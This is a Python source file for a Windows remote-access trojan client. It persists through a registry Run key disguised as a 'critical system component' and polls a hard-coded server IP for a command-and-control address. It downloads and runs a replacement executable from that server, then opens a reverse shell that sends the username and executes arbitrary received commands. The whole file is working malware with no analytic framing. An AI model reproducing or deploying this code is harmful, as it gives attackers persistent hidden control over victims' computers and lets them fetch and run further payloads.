import getpass
import subprocess
import time
from socket import *
import os
import sys
import win32api, win32con, pywintypes
import requests
from lxml import etree


def get_version():
    url = "http://82.157.65.112:444/update_version/"
    html = requests.get(url=url).text
    tree = etree.HTML(html)
    ip = tree.xpath("/html/body/span[1]/text()")[0]
    port = tree.xpath("/html/body/span[2]/text()")[0]
    version = tree.xpath("/html/body/span[3]/text()")[0]
    return ip, port, version


def update_version(new_version):
    if new_version != "1.1.1.0":
        url = "http://82.157.65.112:444/static/client.exe"
        data = requests.get(url).content
        with open('C:/Users/Public/Downloads/client1.exe', 'wb') as fp:
            fp.write(data)
        time.sleep(2)
        return "ok"
    else:
        pass


def AutoStart(path=sys.argv[0].replace("/", "\\")):
    runpath = "Software\Microsoft\Windows\CurrentVersion\Run"
    hKey = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, runpath, 0, win32con.KEY_ALL_ACCESS)
    while True:
        try:
            if str(win32api.RegQueryValueEx(hKey, "系统关键组件")[0]) == path:
                done = True
                break
            else:
                win32api.RegDeleteValue(hKey, "系统关键组件")
                win32api.RegCloseKey(hKey)
                hKey = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, runpath, 0, win32con.KEY_ALL_ACCESS)
                raise pywintypes.error
            done = True
            break
        except pywintypes.error:
            win32api.RegSetValueEx(hKey, "系统关键组件", 0, win32con.REG_SZ, path)
            done = True
    win32api.RegCloseKey(hKey)
    return done


def connect(ip, port):
    client_socket = socket(AF_INET, SOCK_STREAM)
    client_socket.connect((ip, int(port)))
    return client_socket


def client_cmd(c):
    while True:
        user_cmd = c.recv(2048).decode('utf-8')
        if user_cmd == 'exit':
            break
        elif user_cmd.split(' ')[0] == 'cd':
            now_cmd = user_cmd.split(' ')[1]
            os.chdir(now_cmd)
            now_path = os.getcwd()
            c.send(now_path.encode('utf-8'))
        else:
            a = subprocess.Popen(user_cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE)
            a.stdin.close()
            result = a.stdout.read()
            c.send(' '.encode('utf-8') + result)
            a.stdout.close()


if __name__ == '__main__':
    AutoStart()
    while True:
        ip, port, version = get_version()
        a = update_version(version)
        if a == "ok":
            subprocess.Popen("C:/Users/Public/Downloads/client1.exe", shell=True, stdin=subprocess.PIPE,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)
            break
        else:
            try:
                client_socket = connect(ip, port)
                user_name = getpass.getuser()
                client_socket.send(user_name.encode('utf-8'))
                while True:
                    cmd = client_socket.recv(2048).decode('utf-8')
                    if cmd == 'shell':
                        client_socket.send('................进入shell................'.encode('utf-8'))
                        client_cmd(client_socket)
                    else:
                        client_socket.send('[-]发送命令失败'.encode('utf-8'))
            except Exception as e:
                time.sleep(10)
                continue
